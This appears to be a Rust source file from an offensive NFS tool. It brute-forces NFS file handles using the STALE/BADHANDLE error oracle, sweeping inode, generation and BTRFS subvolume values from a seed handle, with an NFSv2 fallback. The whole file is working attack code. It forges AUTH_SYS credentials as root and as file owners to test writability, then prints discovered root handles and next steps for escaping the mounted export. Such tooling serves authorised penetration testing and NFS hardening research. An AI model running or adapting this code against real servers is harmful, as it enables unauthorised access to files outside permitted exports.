//! NFS file-handle brute force using the STALE/BADHANDLE oracle.
//!
//! NFSv3's error semantics distinguish two failure modes for an unknown
//! handle (RFC 1813 S2.6): NFS3ERR_STALE means the format is correct but
//! the inode/generation pair is wrong, while NFS3ERR_BADHANDLE means the
//! format itself is unrecognised. That distinction is an oracle: feed
//! candidate handles, count STALE responses, and you have positive
//! confirmation that the handle layout is right -- the search reduces to
//! sweeping the inode/generation space.
//!
//! The seed handle carries the filesystem ID and handle format. It is taken
//! from the target's `:/export` via MOUNT when present, or supplied directly
//! with `--seed-handle HEX`. Candidates are generated the same way `escape`
//! does -- fingerprint-driven known roots first, then a sweep -- and a hit is
//! accepted on NFS3_OK *or* NFS3ERR_ACCES (a squashed root is still a valid
//! handle).
//!
//! This is a read-only discovery tool: it never writes to the server. A
//! handle is not itself read-write or read-only -- writability is a property
//! of the export's ro/rw flag and the credential used, not the handle. For
//! each hit we report a *non-destructive* writability hint from the advisory
//! ACCESS bitmask (RFC 1813 S3.3.4), probed as uid=0 and as the owner. The
//! authoritative test is to actually write via `shell`/`mount`.

use anyhow::{Context as _, bail};
use clap::Parser;

use crate::cli::probe::{make_client_with_hostname, make_mount_client, parse_addr_with_port};
use crate::cli::target::{self, Source};
use crate::cli::{GlobalOpts, H_BEHAVIOR, H_TARGET};
use crate::engine::file_handle::{EscapeResult, FileHandleAnalyzer, FsType};
use crate::proto::auth::{AuthSys, Credential};
use crate::proto::nfs3::types::{FileHandle, FileType, access};
use crate::proto::nfs3::{Nfs3Client, PooledNfs3 as _};
use crate::util::stealth::StealthConfig;

/// Whether the target speaks NFSv3 or only NFSv2.
enum NfsVersion {
    V3,
    V2Only,
}

/// Brute-force NFS file handles.
///
/// Derives a seed handle (filesystem ID + format) by mounting the target
/// export, or from an explicit `--seed-handle`, then generates candidate
/// handles -- fingerprint-driven known roots first, then an inode/generation
/// sweep -- and reports the first valid root. A hit is accepted on NFS3_OK or
/// NFS3ERR_ACCES (a squashed root is still a valid handle), matching `escape`.
///
/// Read-only: never writes to the server. Each hit carries a non-destructive
/// writability hint from advisory ACCESS bits (the export's ro/rw flag and the
/// credential determine writability, not the handle).
///
/// Examples:
///   nfswolf brute-handle 192.168.1.10:/srv
///   nfswolf brute-handle 192.168.1.10 --seed-handle 01000200... --inode-start 64 --inode-end 256
#[derive(Parser)]
pub(crate) struct BruteHandleArgs {
    /// Target host with optional :/export (e.g. 10.0.0.5:/srv).
    /// The export is mounted to derive the seed handle when --seed-handle is omitted.
    #[arg(help_heading = H_TARGET, value_name = "TARGET")]
    pub target: String,

    /// Export path (alternative to host:/export); mounted to derive the seed handle.
    #[arg(short = 'e', long, value_name = "PATH", help_heading = H_TARGET)]
    pub export: Option<String>,

    /// Seed handle (hex) from a prior mount or escape. Optional: when omitted,
    /// the seed is derived by mounting the target export. Provides fsid + format.
    #[arg(long, value_name = "HEX", help_heading = H_TARGET)]
    pub seed_handle: Option<String>,

    /// Maximum number of handles to probe (across the full inode x gen space).
    #[arg(long, default_value = "10000", value_name = "N", help_heading = H_BEHAVIOR)]
    pub max_attempts: u64,

    /// Start of the inode range (default: 0).
    #[arg(long, default_value = "0", value_name = "INODE", help_heading = H_BEHAVIOR)]
    pub inode_start: u64,

    /// End of the inode range, inclusive (default: 500).
    #[arg(long, default_value = "500", value_name = "INODE", help_heading = H_BEHAVIOR)]
    pub inode_end: u64,

    /// Start of the generation range (default: 0).
    #[arg(long, default_value = "0", value_name = "GEN", help_heading = H_BEHAVIOR)]
    pub gen_start: u32,

    /// End of the generation range, inclusive (default: 0 = only gen 0).
    /// The full search space is (inode_end - inode_start + 1) * (gen_end - gen_start + 1).
    #[arg(long, default_value = "0", value_name = "GEN", help_heading = H_BEHAVIOR)]
    pub gen_end: u32,
}

/// Run the brute-handle command.
pub(crate) async fn run(args: BruteHandleArgs, globals: &GlobalOpts) -> anyhow::Result<()> {
    // Reuse the shared target parser: `host:/export` derives a seed via MOUNT,
    // `--seed-handle HEX` is an explicit override (passed as the handle source,
    // so the parser's colon-vs-handle conflict rules apply for free).
    let target = target::parse(&args.target, args.export.as_deref(), args.seed_handle.as_deref(), false)?;
    let host = target.host.to_string();
    let addr = parse_addr_with_port(&host, globals.nfs_port)?;
    let stealth = StealthConfig::new(globals.delay, globals.jitter);

    // Derive the seed handle (fsid + format) and the export used for the PoolKey.
    // Try MOUNT v3 first; fall back to MOUNT v1 for NFSv2-only servers.
    let (seed, pool_export, nfs_ver) = match &target.source {
        Source::Handle(hex) => (FileHandle::from_hex(hex).context("invalid --seed-handle / --handle")?, "/".to_owned(), NfsVersion::V3),
        Source::Export(path) => {
            let mc = make_mount_client(globals);
            match mc.mount(addr, path).await {
                Ok(mnt) => (mnt.handle, path.clone(), NfsVersion::V3),
                Err(_) => {
                    eprintln!("{}", crate::output::status_info("MOUNT v3 failed, trying MOUNT v1 (NFSv2)"));
                    let mnt = mc.mount_v1(addr, path).await.with_context(|| format!("MNT v3 and v1 both failed for {path}"))?;
                    (mnt.handle, path.clone(), NfsVersion::V2Only)
                },
            }
        },
        Source::None => bail!("no seed handle: pass <HOST>:/export (mounted to derive a seed) or --seed-handle HEX"),
    };

    let fs = FileHandleAnalyzer::fingerprint_fs(&seed);
    let inode_start = args.inode_start;
    let inode_end = args.inode_end;
    let gen_start = args.gen_start;
    let gen_end = args.gen_end;

    if inode_end < inode_start {
        bail!("--inode-end ({inode_end}) must be >= --inode-start ({inode_start})");
    }
    if gen_end < gen_start {
        bail!("--gen-end ({gen_end}) must be >= --gen-start ({gen_start})");
    }

    let inode_count = inode_end - inode_start + 1;
    let gen_count = u64::from(gen_end - gen_start) + 1;
    let search_space = inode_count.saturating_mul(gen_count);

    let ver_label = if matches!(nfs_ver, NfsVersion::V2Only) { "v2" } else { "v3" };
    eprintln!("{}", crate::output::status_info(&format!("Brute-forcing handles on {host} [{fs:?}, {ver_label}] inodes {inode_start}..={inode_end} x gen {gen_start}..={gen_end} ({search_space} candidates, max {})", args.max_attempts)));

    let found = match nfs_ver {
        NfsVersion::V3 => {
            let (_, _, client) = make_client_with_hostname(addr, &pool_export, 0, 0, &[], stealth.clone(), globals.proxy.as_deref(), globals.nfs_port, &globals.hostname);
            let result = if matches!(fs, FsType::Btrfs) {
                sweep_btrfs(&client, &seed, args.max_attempts, &host).await
            } else {
                let r = sweep_inodes(&client, &seed, fs, args.max_attempts, inode_start, inode_end, gen_start, gen_end, &host).await;
                if !r && matches!(fs, FsType::Unknown) {
                    eprintln!("{}", crate::output::status_info("Inode sweep found nothing; trying BTRFS subvolume sweep as fallback"));
                    sweep_btrfs(&client, &seed, args.max_attempts, &host).await
                } else {
                    r
                }
            };
            if !result {
                eprintln!("{}", crate::output::status_info("NFSv3 sweep failed; retrying with NFSv2"));
                sweep_inodes_v2(addr, &seed, args.max_attempts, inode_start, inode_end, gen_start, gen_end, &host, globals).await
            } else {
                result
            }
        },
        NfsVersion::V2Only => sweep_inodes_v2(addr, &seed, args.max_attempts, inode_start, inode_end, gen_start, gen_end, &host, globals).await,
    };

    if !found {
        eprintln!("{}", crate::output::status_warn("No valid handle found. Try widening --inode-start/--inode-end or --gen-start/--gen-end."));
    }
    crate::cli::emit_replay(globals);
    Ok(())
}

/// Outcome of probing one candidate handle with GETATTR.
enum Probe {
    /// Handle resolves to a directory (the filesystem root we want).
    Dir,
    /// Handle resolves to a non-directory object (valid inode, not a root).
    NonDir,
    /// Handle format accepted but access denied (squashed root) -- still a hit.
    Denied,
    /// Correct format, wrong inode/generation (the oracle).
    Stale,
    /// Wrong format or other rejection.
    Miss,
}

/// Probe a candidate handle with GETATTR (as uid=0) and classify the result.
///
/// The classification is the whole point of the search. `Nfs3Error` already
/// draws the distinction the oracle depends on, so this reads it from there
/// rather than re-deriving it from raw status codes: `is_handle_oracle_hit`
/// means the server parsed the handle and looked it up (right format, wrong
/// object -- keep varying the inode), `is_handle_oracle_miss` means it rejected
/// the structure outright (wrong format -- varying the inode is wasted work).
async fn probe(client: &Nfs3Client, fh: &FileHandle) -> Probe {
    match client.attrs(fh).await {
        Ok(a) if a.file_type == FileType::Directory => Probe::Dir,
        Ok(_) => Probe::NonDir,
        // The server resolved the handle and then refused the caller, which
        // still confirms the handle is real.
        Err(e) if e.is_permission_denied() => Probe::Denied,
        Err(e) if e.is_stale() => Probe::Stale,
        Err(_) => Probe::Miss,
    }
}

/// Non-destructive writability hint for a discovered handle.
///
/// Writability is a property of the export (ro/rw) and the credential, not the
/// handle. This never writes: it reads the advisory ACCESS bitmask
/// (RFC 1813 S3.3.4) as uid=0 and, if that grants nothing, as the object's
/// owner -- so a root_squash'd rw export still shows as writable. Advisory only;
/// confirm by actually writing via `shell`/`mount`.
async fn writability_hint(client: &Nfs3Client, fh: &FileHandle) -> String {
    if access_grants_write(client, fh).await {
        return "writable as uid=0 (advisory; rw export, root not squashed)".to_owned();
    }
    // Retry the advisory check as the object's owner: catches a rw export where
    // root is squashed but the owning UID can still write.
    if let Ok(ga) = client.attrs(fh).await {
        let attr_uid = ga.uid;
        let attr_group = ga.gid;
        if attr_uid != 0 {
            let owner = client.with_credential(Credential::Sys(AuthSys::with_groups(attr_uid, attr_group, &[attr_group], "nfswolf")), attr_uid, attr_group);
            if access_grants_write(&owner, fh).await {
                return format!("writable as owner uid={attr_uid} (advisory)");
            }
        }
    }
    "read-only (advisory: no write bits for uid=0 or owner; ro export or restrictive perms)".to_owned()
}

/// Whether the client's credential is granted any write bit on the handle (advisory).
async fn access_grants_write(client: &Nfs3Client, fh: &FileHandle) -> bool {
    matches!(client.check_access(fh, access::ALL).await, Ok(granted) if access::grants_write(granted))
}

/// Print a found handle with its (non-destructive) writability hint and next steps.
async fn report_hit(client: &Nfs3Client, candidate: &EscapeResult, note: &str, host: &str) {
    let rw = writability_hint(client, &candidate.root_handle).await;
    let hex = candidate.root_handle.to_hex();
    let label = if note.contains("root") || note.contains("Root") { "Root handle" } else { "Handle" };
    println!();
    println!("  Filesystem:  {:?}  (inode {}  {note})", candidate.fs_type, candidate.inode_number);
    println!("  Writability: {rw}");
    crate::output::print_handle(label, &hex);
    crate::output::print_handle_next_steps(&hex, host);
    println!();
}

/// Cross-product sweep: (inode_start..=inode_end) x (gen_start..=gen_end).
///
/// Every valid handle is reported. The first root directory is printed as the
/// primary result with writability hint and next-steps; all other hits
/// (directories, files, denied handles) are listed as additional discoveries.
#[expect(clippy::too_many_arguments, reason = "sweep parameters are all caller-controlled range bounds")]
async fn sweep_inodes(client: &Nfs3Client, seed: &FileHandle, _fs: FsType, max_attempts: u64, inode_start: u64, inode_end: u64, gen_start: u32, gen_end: u32, host: &str) -> bool {
    let mut found_root = false;
    let mut extra_hits: Vec<(u64, u32, String)> = Vec::new();
    let mut stale = 0u64;
    let mut tried = 0u64;

    'outer: for inode in inode_start..=inode_end {
        if tried >= max_attempts {
            break;
        }
        let inode32 = u32::try_from(inode).unwrap_or(u32::MAX);
        for generation in gen_start..=gen_end {
            if tried >= max_attempts {
                break 'outer;
            }
            let Some(cand) = FileHandleAnalyzer::construct_handle_for_inode(seed, inode32, generation) else {
                continue;
            };
            tried += 1;
            match probe(client, &cand.root_handle).await {
                Probe::Dir => {
                    if found_root {
                        extra_hits.push((inode, generation, cand.root_handle.to_hex()));
                    } else {
                        report_hit(client, &cand, &format!("root directory, inode {inode} gen {generation}"), host).await;
                        found_root = true;
                    }
                },
                Probe::Denied => {
                    if found_root {
                        extra_hits.push((inode, generation, cand.root_handle.to_hex()));
                    } else {
                        report_hit(client, &cand, &format!("inode {inode} gen {generation} (ACCES -- root_squash)"), host).await;
                        found_root = true;
                    }
                },
                Probe::NonDir => extra_hits.push((inode, generation, cand.root_handle.to_hex())),
                Probe::Stale => stale += 1,
                Probe::Miss => {},
            }
        }
    }
    if !extra_hits.is_empty() {
        eprintln!("{}", crate::output::status_info(&format!("{} additional valid handle(s) discovered:", extra_hits.len())));
        for (inode, generation, hex) in &extra_hits {
            eprintln!("    inode {inode:>6}  gen {generation:>6}  {hex}");
        }
    }
    eprintln!("{}", crate::output::status_info(&format!("Probed {tried} candidates, {stale} STALE")));
    found_root
}

/// BTRFS subvolume sweep (subvol IDs 5 and 256+). Reports all discovered subvolumes.
async fn sweep_btrfs(client: &Nfs3Client, seed: &FileHandle, max_attempts: u64, host: &str) -> bool {
    let max = u32::try_from(max_attempts.min(u64::from(u32::MAX))).unwrap_or(u32::MAX);
    let candidates = FileHandleAnalyzer::construct_btrfs_subvol_handles(seed, max);
    let mut tried = 0u64;
    let mut stale = 0u64;
    let mut found_root = false;
    let mut extra_hits: Vec<(u32, String)> = Vec::new();
    for cand in &candidates {
        if tried >= max_attempts {
            break;
        }
        tried += 1;
        match probe(client, &cand.root_handle).await {
            Probe::Dir => {
                if found_root {
                    extra_hits.push((cand.inode_number, cand.root_handle.to_hex()));
                } else {
                    report_hit(client, cand, &format!("BTRFS subvol {}", cand.inode_number), host).await;
                    found_root = true;
                }
            },
            Probe::Denied => {
                if found_root {
                    extra_hits.push((cand.inode_number, cand.root_handle.to_hex()));
                } else {
                    report_hit(client, cand, &format!("BTRFS subvol {} (ACCES)", cand.inode_number), host).await;
                    found_root = true;
                }
            },
            Probe::NonDir => extra_hits.push((cand.inode_number, cand.root_handle.to_hex())),
            Probe::Stale => stale += 1,
            Probe::Miss => {},
        }
    }
    if !extra_hits.is_empty() {
        eprintln!("{}", crate::output::status_info(&format!("{} additional valid handle(s) discovered:", extra_hits.len())));
        for (subvol, hex) in &extra_hits {
            eprintln!("    subvol {subvol:>6}  {hex}");
        }
    }
    eprintln!("{}", crate::output::status_info(&format!("Tried {tried} BTRFS subvols, {stale} STALE")));
    found_root
}

/// NFSv2 inode sweep using Nfs2Client + DirectTransport.
///
/// NFSv2 has no BADHANDLE oracle (all rejections are NFSERR_STALE per
/// RFC 1094 S2.3.1), so we can't distinguish format errors from wrong
/// inode/gen. Handles are fixed 32 bytes, zero-padded.
#[expect(clippy::too_many_arguments, reason = "sweep parameters are all caller-controlled range bounds")]
async fn sweep_inodes_v2(addr: std::net::SocketAddr, seed: &FileHandle, max_attempts: u64, inode_start: u64, inode_end: u64, gen_start: u32, gen_end: u32, host: &str, globals: &GlobalOpts) -> bool {
    use crate::proto::auth::next_stamp;
    use nfswolf_nfs2::{Nfs2Client, wire::Nfs2FileHandle};
    use nfswolf_rpc::{rpc::opaque_auth, transport::direct::DirectTransport, transport::tokio::TokioIo};

    let nfs_port = globals.nfs_port.unwrap_or(2049);
    let nfs_addr = std::net::SocketAddr::new(addr.ip(), nfs_port);
    let stream = match tokio::net::TcpStream::connect(nfs_addr).await {
        Ok(s) => s,
        Err(e) => {
            eprintln!("{}", crate::output::status_err(&format!("connect to {nfs_addr}: {e}")));
            return false;
        },
    };
    let io = TokioIo::new(stream);
    let cred = AuthSys::new(0, 0, "nfswolf");
    let opaque = cred.to_opaque_auth(next_stamp());
    let transport = DirectTransport::with_auth(io, opaque, opaque_auth::default());
    let client = Nfs2Client::new(transport);

    let mut found_root = false;
    let mut extra_hits: Vec<(u64, u32, String)> = Vec::new();
    let mut stale = 0u64;
    let mut tried = 0u64;

    'outer: for inode in inode_start..=inode_end {
        if tried >= max_attempts {
            break;
        }
        let inode32 = u32::try_from(inode).unwrap_or(u32::MAX);
        for generation in gen_start..=gen_end {
            if tried >= max_attempts {
                break 'outer;
            }
            let Some(cand) = FileHandleAnalyzer::construct_handle_for_inode(seed, inode32, generation) else {
                continue;
            };
            // Pad/truncate to fixed 32 bytes for NFSv2.
            let fh = Nfs2FileHandle::from_bytes(cand.root_handle.as_bytes());
            tried += 1;
            match client.getattr(&fh).await {
                Ok(a) => {
                    let hex = cand.root_handle.to_hex();
                    let is_dir = a.ftype == nfswolf_nfs2::wire::FType::Directory;
                    if is_dir && !found_root {
                        report_hit_v2(&cand, &format!("inode {inode} gen {generation}"), host);
                        found_root = true;
                    } else {
                        extra_hits.push((inode, generation, hex));
                    }
                },
                Err(e) => {
                    if matches!(e.status(), Some(nfswolf_nfs2::NfsStat::Stale)) {
                        stale += 1;
                    }
                },
            }
        }
    }
    if !extra_hits.is_empty() {
        eprintln!("{}", crate::output::status_info(&format!("{} additional valid handle(s) discovered:", extra_hits.len())));
        for (inode, generation, hex) in &extra_hits {
            eprintln!("    inode {inode:>6}  gen {generation:>6}  {hex}");
        }
    }
    eprintln!("{}", crate::output::status_info(&format!("Probed {tried} candidates (v2), {stale} STALE")));
    found_root
}

/// Simpler report for v2 hits (no async writability probe -- v2 has no ACCESS procedure).
fn report_hit_v2(candidate: &EscapeResult, note: &str, host: &str) {
    let hex = candidate.root_handle.to_hex();
    println!();
    println!("  Filesystem:  {:?}  (inode {}  {note})", candidate.fs_type, candidate.inode_number);
    println!("  Writability: unknown (NFSv2 has no ACCESS procedure)");
    crate::output::print_handle("Handle", &hex);
    crate::output::print_handle_next_steps(&hex, host);
    println!();
}
